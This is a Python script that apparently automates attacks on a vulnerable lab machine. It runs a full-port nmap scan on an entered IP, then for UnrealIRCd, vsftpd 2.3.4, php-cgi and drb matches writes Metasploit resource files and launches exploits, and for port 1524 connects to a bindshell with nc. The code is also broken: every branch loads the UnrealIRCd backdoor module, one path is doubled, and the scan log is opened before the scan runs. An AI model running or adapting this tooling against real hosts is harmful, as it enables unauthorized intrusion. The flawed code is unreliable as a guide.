import os
import subprocess

Target = input("[+] Please Enter Your Target Ip Address : ")

file1= open('/home/whoami/Desktop/lab/nmap_log.txt')
#file2 = open('prac.txt' , 'r')
#path to the txt files for nmap result and vulnerability list

def get_nmap():
    global Target
    #makes Target variable global
    com = ("nmap -sV  -p1-65535 -oN nmap_log.txt " )
    process=os.system(com + Target)
#runs the nmap command using -sv parameter and output as txt
    return process

get_nmap()
#calls get_nmap function

def unr():
    a =open('/home/whoami/Desktop/test/RC_scripts/unrealirc.rc', 'w')
    f =("use exploit/unix/irc/unreal_ircd_3281_backdoor" "\n"
    """show options""")
    c ="set RHOST " '{}'.format(Target)

    e = '\n' """exploit"""


    a.write(f)
    a.write('\n')
    a.write(c)
    a.write(e)
    a.close()

def search():
        global file1
        global unr
        
        for line in file1:

                if str("UnrealIRCd") in line:
                    a =open('/home/whoami/Desktop/test/RC_scripts/unrealirc.rc', 'w')
                    f =("use exploit/unix/irc/unreal_ircd_3281_backdoor" "\n"
                    """show options""")
                    c ='set RHOST ' '{}'.format(Target)

                    e = '\n' """exploit"""


                    a.write(f)
                    a.write('\n')
                    a.write(c)
                    a.write(e)
                    a.close()


                    com2 = ('service postgresql start')
                    #starts the postgresql service
                    unrealirc_starter = ('msfconsole -r /home/whoami/Desktop/test/RC_scripts/unrealirc.rc ')
                    #starts the msfconsole using the rc script
                    process2 = os.system(com2)
                    process3 = os.system(unrealirc_starter)

                elif str("vsftpd 2.3.4") in line :
                    a =open('/home/whoami/Desktop/test/RC_scripts/vsftpd234.rc', 'w')
                    f =("use exploit/unix/irc/unreal_ircd_3281_backdoor" "\n"
                    """show options""")
                    c ='set RHOST '  '{}'.format(Target)

                    e = '\n' """exploit"""


                    a.write(f)
                    a.write('\n')
                    a.write(c)
                    a.write(e)
                    a.close()
                    com2 = ('service postgresql start')
                    vsftpd_starter = ('msfconsole -r /home/whoami/Desktop/test/RC_scripts/RC_scripts/vsftpd234.rc')
                    #starts the msfconsole using the rc script
                    process2 = os.system(com2)
                    process3 = os.system(vsftpd_starter)

                elif str("php-cgi") in line :
                    a =open('/home/whoami/Desktop/test/RC_scripts/php-cgi.rc', 'w')
                    f =("use exploit/unix/irc/unreal_ircd_3281_backdoor" "\n"
                    """show options""")
                    c ='set RHOST '  '{}'.format(Target)

                    e = '\n' """exploit"""


                    a.write(f)
                    a.write('\n')
                    a.write(c)
                    a.write(e)
                    a.close()
                    com2 = ('service postgresql start')
                    php_cgi_starter = ('msfconsole -r /home/whoami/Desktop/test/RC_scripts/php-cgi.rc')
                    process2 = os.system(com2)
                    process3 = os.system(php_cgi_starter)

                elif str("drb") in line :
                    a=open('/home/whoami/Desktop/test/drb_remote_codeexec.rc', 'w')
                    f =("use exploit/unix/irc/unreal_ircd_3281_backdoor" "\n"
                    """show options""")
                    c ='set RHOST '  '{}'.format(Target)

                    e = '\n' """exploit"""


                    a.write(f)
                    a.write('\n')
                    a.write(c)
                    a.write(e)
                    a.close()
                    com2 = ('service postgresql start')
                    drb_starter =("msfconsole -r /home/whoami/Desktop/test/RC_scripts/drb_remote_codeexec.rc")
                    process2 = os.system(com2)
                    process3 = os.system(drb_starter)




                elif str("1524/tcp") in line:
                    nc_com = ('nc {} 1524').format(Target)
                    os.system(nc_com)



search()
